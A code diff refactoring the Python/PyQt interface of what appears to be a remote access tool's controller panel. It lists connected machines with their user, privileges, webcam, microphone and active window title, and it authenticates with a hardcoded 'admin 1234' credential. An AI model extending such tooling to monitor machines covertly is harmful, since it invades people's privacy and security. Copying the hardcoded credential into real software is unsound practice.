@@ -50,24 +50,18 @@ _ = lambda _word: translate.word(_word)
 
 
 def get_ip_location(ip):
-    country_flag = os.path.join(flags, geo_ip_database.country_code_by_addr(ip).lower() + '.png')
-    if os.path.exists(country_flag):
-        return country_flag
-    else:
+    try:
+        country_flag = os.path.join(flags, geo_ip_database.country_code_by_addr(ip).lower() + '.png')
+        if os.path.exists(country_flag):
+            return country_flag
+        else:
+            return os.path.join(flags, 'blank.png')
+    except:
         return os.path.join(flags, 'blank.png')
 
 
 def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
-
-
-def os_icon(os_type):
-    if os_type == "linux" or os_type == "linux2":
-        return 'linux.png'
-    elif os_type == "darwin":
-        return 'mac.png'
-    elif os_type == "win32":
-        return 'windows.png'
 
 
 class MainDialog(QMainWindow, gui.Ui_MainWindow):
@@ -200,7 +194,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # END HEADERS
 
         # BOTTOM
-        self.madeByLabel.setText(_('BOTTOM_MADE_BY'))
         self.clientStatusLabel.setText(_('BOTTOM_STATUS'))
         self.ipv4TextLabel.setText(_('BOTTOM_IPV4'))
         self.portTextLabel.setText(_('BOTTOM_PORT'))
@@ -243,7 +236,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             session_id = id_generator(size=24)
             self.connection_socket.connect((self.IPADDRESS, self.PORT))
             auth_status = get(self.connection_socket, 'auth admin 1234', session_id)
-            print auth_status
             if auth_status == 'LoginSuccess':
                 self.servers_checker_thread = threading.Thread(target=self.check_servers, args=(session_id,))
                 self.servers_checker_thread.start()
@@ -316,42 +308,59 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
     # Update Servers Table from self.socks
     def update_servers_table(self):
-        self.serversTable.setRowCount(len(self.streaming_socks))
+
+        online_clients = {}
+        offline_clients = {}
+
+        self.serversTable.clearContents()
+        self.offlineServersTable.clearContents()
+
+        # Split Clients
+        for index, key in enumerate(self.streaming_socks):
+            if self.streaming_socks[key]['status']:
+                online_clients[index] = self.streaming_socks[key]
+            else:
+                offline_clients[index] = self.streaming_socks[key]
+
+        self.serversTable.setRowCount(len(online_clients))
         try:
-            for index, obj in enumerate(self.streaming_socks):
+            for index, obj in enumerate(online_clients):
 
                 # add ip address & county flag
-                ip_address = self.streaming_socks[obj]['ip_address']
+                ip_address = online_clients[obj]['ip_address']
                 item = QTableWidgetItem(ip_address)
                 item.setIcon(QIcon(get_ip_location(ip_address)))
                 self.serversTable.setItem(index, self.index_of_ipAddress, item)
 
                 # add alias if aviable
-                alias = self.alias.get_alias(self.streaming_socks[obj]['ip_address'], self.streaming_socks[obj]['os'])
+                alias = self.alias.get_alias(online_clients[obj]['ip_address'], online_clients[obj]['os'])
                 item = QTableWidgetItem(alias)
                 self.serversTable.setItem(index, self.index_of_alias, item)
 
                 # add socket number
-                item = QTableWidgetItem(str(self.streaming_socks[obj]['socket']))
+                socket_value = str(online_clients[obj]['socket'])
+                item = QTableWidgetItem(socket_value)
+                if socket_value == 'OFFLINE':
+                    item.setFlags( Qt.ItemIsSelectable |  Qt.ItemIsEnabled )
                 item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                 self.serversTable.setItem(index, self.index_of_socket, item)
 
                 # add os version
-                item = QTableWidgetItem(self.streaming_socks[obj]['os'])
-                item.setIcon(QIcon(os.path.join(assets, os_icon(self.streaming_socks[obj]['ostype']))))
+                item = QTableWidgetItem(online_clients[obj]['os'])
+                item.setIcon(QIcon(os.path.join(assets, 'windows.png')))
                 self.serversTable.setItem(index, self.index_of_os, item)
 
                 # add server user
-                item = QTableWidgetItem(self.streaming_socks[obj]['user'])
+                item = QTableWidgetItem(online_clients[obj]['user'])
                 item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
                 self.serversTable.setItem(index, self.index_of_user, item)
 
                 # add user privileges
                 try:
-                    privs_status = _('INFO_USER') if not self.streaming_socks[obj]['privileges'] == '1' else _(
+                    privs_status = _('INFO_USER') if not online_clients[obj]['privileges'] == '1' else _(
                         'INFO_ADMIN')
                 except KeyError:
-                    print self.streaming_socks[obj]
+                    print online_clients[obj]
                 item = QTableWidgetItem()
                 if privs_status == _('INFO_ADMIN'):
                     item.setIcon(QIcon(os.path.join(assets, 'admin.png')))
@@ -361,7 +370,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.serversTable.setItem(index, self.index_of_privs, item)
 
                 # add server lock status
-                lock_status = _('INFO_LOCKED') if self.streaming_socks[obj]['protection'] == 'False' else _(
+                lock_status = _('INFO_LOCKED') if online_clients[obj]['protection'] == 'False' else _(
                     'INFO_UNLOCKED')
                 item = QTableWidgetItem(lock_status)
                 if lock_status == _('INFO_LOCKED'):
@@ -374,7 +383,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                 # add input device
                 item = QTableWidgetItem()
-                if self.streaming_socks[obj]['inputdevice'] == 'NoDevice':
+                if online_clients[obj]['inputdevice'] == 'NoDevice':
                     item.setIcon(QIcon(os.path.join(assets, 'mic_no.png')))
                     item.setText(_('INFO_NO'))
                 else:
@@ -384,7 +393,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                 # add webcam device
                 item = QTableWidgetItem()
-                if self.streaming_socks[obj]['webcamdevice'] == 'NoDevice':
+                if online_clients[obj]['webcamdevice'] == 'NoDevice':
                     item.setIcon(QIcon(os.path.join(assets, 'web_camera_no.png')))
                     item.setText(_('INFO_NO'))
                 else:
@@ -393,15 +402,40 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.serversTable.setItem(index, self.index_of_webcamera, item)
 
                 # add active windows title
-                item = QTableWidgetItem(self.streaming_socks[obj]['activewindowtitle'])
+                item = QTableWidgetItem(online_clients[obj]['activewindowtitle'])
                 item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                 item.setTextColor(QColor('#1abc9c'))
                 self.serversTable.setItem(index, self.index_of_activeWindowTitle, item)
         except RuntimeError:
             pass
 
+        self.offlineServersTable.setRowCount(len(offline_clients))
+        try:
+            for index, obj in enumerate(offline_clients):
+
+                # add active windows title
+                item = QTableWidgetItem(offline_clients[obj]['alias'])
+                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
+                #item.setTextColor(QColor('#1abc9c'))
+                self.offlineServersTable.setItem(index, 0, item)# add active windows title
+
+                item = QTableWidgetItem(offline_clients[obj]['ip_address'])
+                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
+                #item.setTextColor(QColor('#1abc9c'))
+                self.offlineServersTable.setItem(index, 1, item)# add active windows title
+
+                item = QTableWidgetItem(offline_clients[obj]['last_online'])
+                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
+                #item.setTextColor(QColor('#1abc9c'))
+                self.offlineServersTable.setItem(index, 2, item)
+
+        except RuntimeError:
+            pass
+
         # update servers online counter
-        self.onlineStatus.setText(str(len(self.streaming_socks)))
+        self.onlineStatus.setText(str(len(online_clients)))
+
+
 
     def unlock_client(self):
         while 1:
@@ -414,7 +448,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                         try:
                             _hash.update(str(text))
                             answer = get(self.connection_socket, _hash.hexdigest(), client)
-                            print answer
                             if 'iamactive' in answer:
                                 break
                         except UnicodeEncodeError:
